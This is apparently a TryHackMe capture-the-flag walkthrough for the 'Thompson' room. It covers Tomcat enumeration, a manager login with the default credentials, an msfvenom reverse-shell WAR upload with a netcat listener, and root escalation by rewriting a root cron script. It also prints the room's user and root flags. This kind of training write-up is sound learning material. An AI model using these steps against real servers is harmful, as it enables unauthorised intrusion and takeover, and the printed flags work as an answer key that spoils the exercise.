## Thompson - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/bsidesgtthompson)

**IP: 10.10.37.157**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster, msfvenom

**Author**: <br>

mauzware aka mauzinho <br>
[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan.
  ```
  nmap -sC -sV -T5 -p- 10.10.37.157 
  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
  8080/tcp open  http    Apache Tomcat 8.5.5
  ```
  
- Visited `http://10.10.37.157:8080` and it's Apache Tomcat page, put it in Gobuster.
  ```
  gobuster dir -u http://10.10.37.157:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt ->
  /docs                 (Status: 302) [Size: 0] [--> /docs/]
  /examples             (Status: 302) [Size: 0] [--> /examples/]
  /manager              (Status: 302) [Size: 0] [--> /manager/]
  ```
  
- Then, I visited `http://10.10.37.157:8080/manager` and got this error:
  ```
  You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

  For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.
  
  <role rolename="manager-gui"/>
  <user username="tomcat" password="s3cret" roles="manager-gui"/>
  ```

- Awesome, I have credentials now, let's log in to manager GUI with them. After going through manager GUI, I found an option to upload `.war` files. Awesome, upload a shell!

---

## ⚙️ Shell Access

- Created a shell with `msfvenom`, started a listener and then visited the page `http://10.10.37.157:8080/shell/` in order to get interractive shell. I used Java shell here but you can use any shell.
  ```
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOUR-THM-IP] LPORT=4444 -f war -o shell.war
  nc -lvnp 4444

  upload the shell through manager GUI and visit the page
  ```
  
- Perfect, I got a shell, let's convert it to `putty`
  ```
  python -c "import pty; pty.spawn('/bin/bash')"
  ```
  
- I also experimented with GhostCat exploit but it was unsuccessfull, app is vulnerable to LFI but couldn't make it work tho...

---

## 🧍 User Privilege Escalation

- Now, since I got a shell, finding user flag is not a problem
  ```
  find / -name user.txt
  /home/jack/user.txt
  
  cat /home/jack/user.txt
  39400c90bc683a41a8935e4719f181bf
  ```
  
- Perfect, moving to escalation.

---

## 👑 Root Privilege Escalation

- After enumerating, I decided to go with `cronjobs` since it was my best option. Due to configuration, `cronjobs` prints content of `test.txt` every minute
  ```
  cat /etc/crontab
  cd /home/jack && bash id.sh
  
  cd /home/jack
  cat test.txt
  uid=0(root) gid=0(root) groups=0(root)
  
  cat id.sh 
  #!/bin/bash
  id > test.txt
  ```
  
- OK, now change `id.sh` to print `root.txt` instead of ID.
  ```
  echo '#!/bin/bash' > id.sh
  echo 'cat /root/root.txt > test.txt' >> id.sh 
  ```
  
- It worked, you still have to wait a bit for `cronjobs` to resolve before getting the flag.
  ```
  cat test.txt
  d89d5391984c0450a95497153ae7ca3a
  ```

---

## 🏁 Flags

- **User Flag**: `39400c90bc683a41a8935e4719f181bf`
- **Root Flag**: `d89d5391984c0450a95497153ae7ca3a`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Exploiting with GhostCat which I didn't use to get the flags...`

- What did I learn?
  `Persistence is the key!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
